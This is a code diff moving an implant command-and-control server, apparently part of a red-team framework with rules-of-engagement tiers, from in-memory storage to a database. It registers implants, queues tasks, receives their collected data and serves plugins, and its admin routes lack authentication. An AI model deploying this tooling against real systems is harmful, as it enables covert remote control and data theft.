@@ -1,18 +1,22 @@
 from fastapi import APIRouter, Depends, HTTPException, Body, WebSocket, WebSocketDisconnect
-from typing import Dict, Any
+from sqlalchemy.orm import Session
+from typing import List, Dict
 import os
+import uuid
 
-from . import models
-from . import security
+from . import models, security
+from .database import SessionLocal
 from .comms import manager
 
 router = APIRouter()
 
-# ==============================================================================
-# In-Memory "Database"
-# ==============================================================================
-IMPLANTS_DB: Dict[str, models.Implant] = {}
-
+# --- Dependency ---
+def get_db():
+    db = SessionLocal()
+    try:
+        yield db
+    finally:
+        db.close()
 
 # ==============================================================================
 # ROE (Rules of Engagement) Logic
@@ -23,61 +27,71 @@ ROE_GATES = {
     3: [],
 }
 
-def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
-    if command != "start_plugin":
-        return True
+def check_roe(db: Session, implant_id: str, command: str, args: Dict) -> bool:
+    if command != "start_plugin": return True
     plugin_name = args.get("plugin_name")
-    if not plugin_name:
-        return False
-    tier = IMPLANTS_DB[implant_id].roe_tier
-    return plugin_name in ROE_GATES.get(tier, [])
+    if not plugin_name: return False
+    implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    if not implant: return False
+    return plugin_name in ROE_GATES.get(implant.roe_tier, [])
 
 # ==============================================================================
 # API Endpoints
 # ==============================================================================
 
 @router.post("/register", response_model=models.RegistrationResponse)
-def register_implant(registration: models.ImplantRegistration):
-    implant = models.Implant(**registration.model_dump())
-    IMPLANTS_DB[implant.id] = implant
-    token = security.create_access_token(data={"sub": implant.id})
-    return {"implant_id": implant.id, "token": token}
+def register_implant(registration: models.ImplantBase, db: Session = Depends(get_db)):
+    implant_id = str(uuid.uuid4())
+    db_implant = models.Implant(id=implant_id, **registration.model_dump())
+    db.add(db_implant)
+    db.commit()
+    db.refresh(db_implant)
+
+    token = security.create_access_token(data={"sub": implant_id})
+    return {"implant_id": implant_id, "token": token}
 
 @router.get("/tasks", response_model=models.TaskResponse)
-def get_tasks(current_implant_id: str = Depends(security.get_current_implant_id)):
-    implant = IMPLANTS_DB.get(current_implant_id)
-    if not implant:
-        raise HTTPException(status_code=404, detail="Implant not found")
-    tasks = implant.tasks
-    implant.tasks = []
-    return {"tasks": tasks}
+def get_tasks(db: Session = Depends(get_db), current_implant_id: str = Depends(security.get_current_implant_id)):
+    tasks_from_db = db.query(models.Task).filter(models.Task.implant_id == current_implant_id).all()
+    task_schemas = [models.TaskSchema.from_orm(task) for task in tasks_from_db]
+    for task in tasks_from_db:
+        db.delete(task)
+    db.commit()
+    return {"tasks": task_schemas}
 
 @router.post("/data")
 def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
     print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
     return {"status": "received"}
 
-@router.get("/admin/implants", response_model=Dict[str, models.Implant])
-def list_implants():
-    return IMPLANTS_DB
+@router.get("/admin/implants", response_model=List[models.ImplantSchema])
+def list_implants(db: Session = Depends(get_db)):
+    return db.query(models.Implant).all()
 
-@router.post("/admin/tasks/{implant_id}", response_model=Dict)
-def add_task(implant_id: str, task: models.Task = Body(...)):
-    if implant_id not in IMPLANTS_DB:
+@router.post("/admin/tasks/{implant_id}", response_model=models.TaskSchema)
+def add_task(implant_id: str, task: models.TaskCreate, db: Session = Depends(get_db)):
+    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    if not db_implant:
         raise HTTPException(status_code=404, detail="Implant not found")
-    if not check_roe(implant_id, task.command, task.args):
+    if not check_roe(db, implant_id, task.command, task.args):
         raise HTTPException(status_code=403, detail="ROE VIOLATION")
-    IMPLANTS_DB[implant_id].tasks.append(task)
-    return {"status": "task added", "task_id": task.task_id}
+    db_task = models.Task(**task.model_dump(), implant_id=implant_id)
+    db.add(db_task)
+    db.commit()
+    db.refresh(db_task)
+    return db_task
 
-@router.put("/admin/tier/{implant_id}/{tier}", response_model=Dict)
-def set_implant_tier(implant_id: str, tier: int):
-    if implant_id not in IMPLANTS_DB:
+@router.put("/admin/tier/{implant_id}/{tier}", response_model=models.ImplantSchema)
+def set_implant_tier(implant_id: str, tier: int, db: Session = Depends(get_db)):
+    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    if not db_implant:
         raise HTTPException(status_code=404, detail="Implant not found")
     if tier not in ROE_GATES:
         raise HTTPException(status_code=400, detail="Invalid tier")
-    IMPLANTS_DB[implant_id].roe_tier = tier
-    return {"status": "tier updated", "implant_id": implant_id, "new_tier": tier}
+    db_implant.roe_tier = tier
+    db.commit()
+    db.refresh(db_implant)
+    return db_implant
 
 @router.get("/admin/plugins/{plugin_name}", response_model=Dict)
 def get_plugin_source(plugin_name: str):
@@ -93,6 +107,12 @@ def get_plugin_source(plugin_name: str):
 
 @router.websocket("/ws/implant/{implant_id}")
 async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
+    db = SessionLocal()
+    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    db.close()
+    if not db_implant:
+        await websocket.close(code=1008)
+        return
     await manager.connect_implant(websocket, implant_id)
     try:
         while True:
@@ -103,6 +123,12 @@ async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
 
 @router.websocket("/ws/cli/{implant_id}")
 async def websocket_cli_endpoint(websocket: WebSocket, implant_id: str):
+    db = SessionLocal()
+    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    db.close()
+    if not db_implant:
+        await websocket.close(code=1008)
+        return
     await manager.connect_operator(websocket, implant_id)
     try:
         while True:
